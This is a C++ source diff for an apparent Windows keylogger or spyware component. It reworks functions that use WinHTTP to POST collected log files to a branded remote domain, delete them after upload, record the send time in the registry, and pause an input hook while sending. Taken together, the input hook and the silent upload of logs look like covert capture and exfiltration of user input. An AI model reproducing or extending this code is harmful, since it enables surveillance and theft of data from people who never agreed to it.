@@ -24,16 +24,6 @@ namespace
     const size_t fileSizeToSplit = 500000; // do not split log anymore if its size less then this
 }
 
-
-CComPtr<IWinHttpRequest> CreateHTTPRequest()
-{
-    CComPtr<IWinHttpRequest> pIXMLHTTPRequest;
-    if (FAILED(pIXMLHTTPRequest.CoCreateInstance(L"WinHttp.WinHttpRequest.5.1")))
-        throw std::runtime_error("Cannot create HTTP request instance");
-    return pIXMLHTTPRequest;
-}
-
-
 template<class Out_t, class In_t>
 Out_t encodeToBase64(In_t const& text)
 {
@@ -125,21 +115,14 @@ inline void debugTrace(std::wstring const& logMsg)
 template<class ... T>
 std::future<bool> postData(std::wstring const& url, std::pair<const char*, T>&& ... key_values)
 {
-#ifdef DEBUG
-    // disable hooking while sending
-    const bool isHooking = InputHooker::instance().isHooking();
-    InputHooker::instance().stopHook();
-    auto enableLogger = [isHooking](void*) {if(isHooking) InputHooker::instance().startHook(); };
-    std::unique_ptr<void, decltype(enableLogger)> onRet((void*)1/*must be not nullptr*/, enableLogger);
-#endif // DEBUG
-
     auto postDataImpl = [&]() {
+        CoInitialize(NULL);
+        auto uninit = [](void*) {CoUninitialize(); };
+        std::unique_ptr<void, decltype(uninit)> onRet((void*)1/*must be not nullptr*/, uninit);
+        CComPtr<IWinHttpRequest> request;
         try {
-            CoInitialize(NULL);
-            auto uninit = [](void*) {CoUninitialize(); };
-            std::unique_ptr<void, decltype(uninit)> onRet((void*)1/*must be not nullptr*/, uninit);
-
-            CComPtr<IWinHttpRequest> request = CreateHTTPRequest();
+            if (FAILED(request.CoCreateInstance(L"WinHttp.WinHttpRequest.5.1")))
+                throw std::runtime_error("Cannot create HTTP request instance");
             if (FAILED(request->Open(_bstr_t(L"POST").GetBSTR(), _bstr_t(url.c_str()).GetBSTR(), _variant_t(false))))
                 throw std::runtime_error("Cannot create open request");
             if (FAILED(request->SetRequestHeader(_bstr_t(L"Content-Type").GetBSTR(), _bstr_t(L"application/x-www-form-urlencoded").GetBSTR())))
@@ -158,20 +141,23 @@ std::future<bool> postData(std::wstring const& url, std::pair<const char*, T>&& 
             request->get_ResponseText(content.GetAddress());
 
             if (content.length() != 0) {
-
                 std::wstring decodedReply;
                 if (content.GetBSTR()) {
                     decodedReply = static_cast<wchar_t*>(content.GetBSTR());
                     debugTrace(std::wstring(L"received\n") + decodedReply);
                     // TODO: process request
                 }
-
                 return true;
             }
 
             return false;
-        } catch(std::exception const& ee) {std::cerr << ee.what(); Logger::instance() << ee.what();}
-        catch(...) {std::cerr << "unhandled exception in" << __FUNCTION__;}
+        } catch(std::exception const& ee) {
+            std::cerr << ee.what();
+            //_bstr_t status;
+            //request->get_StatusText(status.GetAddress());
+            Logger::instance() << ee.what()// << "; request status is " << static_cast<LPWSTR>(status)
+                               ;
+        } catch(...) {std::cerr << "unhandled exception in" << __FUNCTION__;}
         return false;
     };
 
@@ -203,44 +189,50 @@ void trySplitLog(std::tr2::sys::path const& logPath)
 std::future<bool> postAllNewLogfiles()
 {
     auto postNewLogs = [](const time_t postTime) {
-
+#ifdef _DEBUG
         // disable hooking while sending
         const bool isHooking = InputHooker::instance().isHooking();
         InputHooker::instance().stopHook();
         auto enableLogger = [isHooking](void*) {if(isHooking) InputHooker::instance().startHook(); };
         std::unique_ptr<void, decltype(enableLogger)> onRet((void*)1/*must be not nullptr*/, enableLogger);
+#endif // _DEBUG
 
+        try {
 
-        using namespace std::tr2::sys;
-        // read last logs sent time
-        RegistryHelper reg(HKEY_CURRENT_USER, _T("Software\\") _T(BRAND_COMPANYNAME) _T("\\") _T(BRAND_NAME));
-        const time_t lastSentTime = std::stoull(std::wstring(L"0") + reg.readValue(_T("logsPostTime")));
-        // get list of new files
-        directory_iterator logDirIter(Logger::instance().logFilename().parent_path(), std::error_code());
+            using namespace std::tr2::sys;
+            // read last logs sent time
+            RegistryHelper reg(HKEY_CURRENT_USER, _T("Software\\") _T(BRAND_COMPANYNAME) _T("\\") _T(BRAND_NAME));
+            const time_t lastSentTime = std::stoull(std::wstring(L"0") + reg.readValue(_T("logsPostTime")));
+            // get list of new files
+            directory_iterator logDirIter(Logger::instance().logFilename().parent_path(), std::error_code());
 
-        std::vector<std::future<void>> splitTasks;
+            std::vector<std::future<void>> splitTasks;
 
-        bool success = true;
-        for (auto& log : logDirIter)
-            if (log != Logger::instance().logFilename()) {
-                const time_t fileTime = std::chrono::system_clock::to_time_t(last_write_time(log));
+            bool success = true;
+            for (auto& log : logDirIter)
+                if (log != Logger::instance().logFilename()) {
+                    const time_t fileTime = std::chrono::system_clock::to_time_t(last_write_time(log));
 
-                if (is_regular_file(log, std::error_code()) && fileTime >= lastSentTime) {
-                    //__yield_value
-                    const bool local_success = postData(_T("https://") _T(BRAND_DOMAIN) _T("/inefan/"), std::make_pair("appId", appId()), std::make_pair("logfile", log.path())).get();
-                    success = success && local_success;
-                    if (local_success)
+                    if (is_regular_file(log, std::error_code()) && fileTime >= lastSentTime) {
+                        //__yield_value
+                        const bool local_success = postData(_T("https://") _T(BRAND_DOMAIN) _T("/inefan/"), std::make_pair("appId", appId()), std::make_pair("logfile", log.path())).get();
+                        success = success && local_success;
+                        if (local_success)
+                            remove(log, std::error_code());
+                        else
+                            splitTasks.push_back(
+                                std::async(std::launch::async, trySplitLog, path(log.path())));
+                    } else
                         remove(log, std::error_code());
-                    else
-                        splitTasks.push_back(
-                            std::async(std::launch::async, trySplitLog, path(log.path()))
-                        );
-                } else
-                    remove(log, std::error_code());
-            }
-        if (success)
-            reg.writeValue(_T("logsPostTime"), std::to_wstring(postTime));
-        return success;
+                }
+            if (success)
+                reg.writeValue(_T("logsPostTime"), std::to_wstring(postTime));
+            return success;
+        } catch (std::exception const& ee) {
+            std::cerr << ee.what() << " at " << __FUNCTION__;
+            Logger::instance() << ee.what() << " at " << __FUNCTION__;
+        } catch (...) { std::cerr << "unknown exception at " << __FUNCTION__; }
+        return false;
     };
 
     return std::async(std::launch::async, postNewLogs, time(0));
